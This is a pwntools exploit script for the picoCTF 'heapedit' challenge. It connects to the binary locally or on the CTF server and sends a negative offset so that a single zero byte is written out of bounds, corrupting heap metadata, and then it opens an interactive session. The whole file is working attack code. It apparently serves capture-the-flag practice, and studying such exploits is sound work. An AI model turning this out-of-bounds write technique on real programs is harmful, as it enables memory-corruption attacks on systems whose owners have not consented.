#!/usr/bin/env python3

from pwn import *

exe = ELF("./heapedit")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        p = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

        if args.GDB:
            gdb.attach(p, 'b*0x00400a7c')

        return p
    else:
        return remote("mercury.picoctf.net", 34499)


def main():
    r = conn()

    offset = 0x12f41f1d0 - 0x12f41ddb8
    newbyte = b'\x00'

    r.recvuntil(': ')
    r.sendline('-' + str(offset))

    r.recvuntil(': ')
    r.sendline(newbyte)

    r.interactive()


if __name__ == "__main__":
    main()
